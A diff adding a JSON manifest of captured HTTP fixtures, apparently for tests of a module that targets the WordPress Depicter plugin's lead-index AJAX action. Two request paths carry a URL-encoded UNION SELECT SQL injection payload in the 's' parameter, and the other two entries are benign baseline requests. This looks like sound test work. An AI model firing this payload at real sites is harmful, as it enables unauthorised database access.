@@ -1,0 +1,45 @@
+{
+  "sources": [
+    {
+      "label": "scalar",
+      "source_file": "tmp/module-target-tests/20261116T072332-e92821/depicter/native-depicter.json",
+      "source_sha256": "295a12842f50d344e00417081ce6a6b27aa8a741c0385f6d3387c854ef3053fd",
+      "request_index_zero_based": 4,
+      "method": "GET",
+      "path": "/wp-admin/admin-ajax.php?action=depicter-lead-index&s=9171%27%29+UNION+SELECT+9172%2C9173%2C%280x6d6f64756c655f7461726765745f6e61746976655f6265666f7265%29%2C9174%2C9175--+-&perpage=10&page=1&orderBy=source_id&order=ASC&dateStart=&dateEnd=&sources=",
+      "body_sha256": "debbe31aaab8e1147a628fabb691666130c9fa445da828d850ab1ec96bf0e486",
+      "transformation": "Decoded body bytes only; headers and cookies omitted. No credential fields occur in these selected bodies."
+    },
+    {
+      "label": "prefix_scalar",
+      "source_file": "tmp/module-target-tests/20261116T072332-e92821/depicter_prefix/native-depicter.json",
+      "source_sha256": "88484fe8ca1d080170123a10b4be7ef1824ed3fa7bc0ee85b1e2169ebc6c2d04",
+      "request_index_zero_based": 4,
+      "method": "GET",
+      "path": "/wordpress/wp-admin/admin-ajax.php?action=depicter-lead-index&s=9171%27%29+UNION+SELECT+9172%2C9173%2C%280x6d6f64756c655f7461726765745f6e61746976655f6265666f7265%29%2C9174%2C9175--+-&perpage=10&page=1&orderBy=source_id&order=ASC&dateStart=&dateEnd=&sources=",
+      "body_sha256": "debbe31aaab8e1147a628fabb691666130c9fa445da828d850ab1ec96bf0e486",
+      "transformation": "Decoded body bytes only; headers and cookies omitted. No credential fields occur in these selected bodies."
+    },
+    {
+      "label": "empty",
+      "source_file": "tmp/module-target-tests/20261116T072332-e92821/depicter/native-depicter.json",
+      "source_sha256": "295a12842f50d344e00417081ce6a6b27aa8a741c0385f6d3387c854ef3053fd",
+      "request_index_zero_based": 3,
+      "method": "GET",
+      "path": "/wp-admin/admin-ajax.php?action=depicter-lead-index&s=module-target-no-matching-lead&perpage=10&page=1&orderBy=source_id&order=ASC&dateStart=&dateEnd=&sources=",
+      "body_sha256": "3fa0a2ac1729ced65216654b5ce5d16809bf22a650ae14a005f740ffcd008467",
+      "transformation": "Decoded body bytes only; headers and cookies omitted. No credential fields occur in these selected bodies."
+    },
+    {
+      "label": "denied",
+      "source_file": "tmp/wordpress-depicter-feasibility/native-3.6.2-20261116T071137/receipt.json",
+      "source_sha256": "ad13ad674507eebeb3832e816969f09fda9c55cbc390c3d1fd3668d709710be2",
+      "request_index_zero_based": 4,
+      "method": "GET",
+      "path": "/wp-admin/admin-ajax.php?action=depicter-lead-index&s=depicter-native&perpage=10&page=1&orderBy=source_id&order=ASC&dateStart=&dateEnd=&sources=",
+      "body_sha256": "1b739b1fdf9bf4364e9e841e724bea5895d3242d8e1bd1371a716649a49be116",
+      "transformation": "Decoded body bytes only; headers and cookies omitted. No credential fields occur in these selected bodies."
+    }
+  ],
+  "limits": "Real native body captures. Dynamic SQL scalar substitutions and malformed variants in the unit adapter are synthetic. No native execution is performed by the specs."
+}
